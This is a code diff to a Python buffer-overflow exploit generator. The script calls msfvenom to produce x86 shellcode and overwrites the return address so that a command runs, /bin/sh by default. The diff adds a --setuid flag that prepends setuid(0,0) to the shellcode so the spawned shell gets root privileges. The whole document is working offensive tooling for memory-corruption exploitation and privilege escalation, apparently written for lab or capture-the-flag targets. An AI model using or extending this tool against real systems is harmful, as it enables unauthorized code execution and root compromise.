@@ -106,7 +106,7 @@ def generate_dummy_payload(offset_size, version):
     print("-" * 80 + "\n", file=sys.stderr)
 
 
-def generate_shellcode(cmd_string):
+def generate_shellcode(cmd_string, setuid=False):
     """Utilizes msfvenom to generate a shellcode payload"""
     # Generates the shellcode to stderr
     print(f"[*] Generating shellcode for command: '{cmd_string}'...", file=sys.stderr)
@@ -121,6 +121,9 @@ def generate_shellcode(cmd_string):
         '-a', 'x86',
         '-f', 'raw'
     ]
+
+    if setuid:
+     	msfvenom_cmd.append('PrependSetuid=true')
     
     try:
         shellcode = subprocess.check_output(msfvenom_cmd, stderr=subprocess.DEVNULL)
@@ -136,7 +139,7 @@ def generate_shellcode(cmd_string):
 # =========================================================
 # PAYLOAD GENERATION
 # =========================================================
-def generate_payload(padding_size, ret_addr_hex, cmd_string, version):
+def generate_payload(padding_size, ret_addr_hex, cmd_string, version, setuid):
     """Mounts the buffer overflow structure."""
     # 1. HANDLE RET ADDR (LITTLE ENDIAN)
     try:
@@ -148,7 +151,7 @@ def generate_payload(padding_size, ret_addr_hex, cmd_string, version):
         sys.exit(1)
 
     # 2. GENERATE SHELLCODE
-    shellcode = generate_shellcode(cmd_string)
+    shellcode = generate_shellcode(cmd_string, setuid)
 
     # 3. MOUNT & PRINT
     # Convert bytes to hex
@@ -189,6 +192,7 @@ def main():
     parser.add_argument("--ret", type=str, default="0xbffffb04", help="The address to override EIP with (Default: 0xbffffb04)")
     parser.add_argument("--cmd", type=str, default="/bin/sh", help="CMD to be executed  (Default: /bin/sh)")
     parser.add_argument("--version", choices=["python2", "python3"], default="python3", help="Python version for the command (Default: python3)")
+    parser.add_argument("--setuid", action="store_true", help="Sets the setuid(0,0) in the shellcode")
 
     args = parser.parse_args()
 
@@ -204,7 +208,7 @@ def main():
     elif args.dummy:
         generate_dummy_payload(args.dummy, args.version)
     else:
-        generate_payload(args.padding, args.ret, args.cmd, args.version)
+        generate_payload(args.padding, args.ret, args.cmd, args.version, args.setuid)
 
 if __name__ == "__main__":
     main()
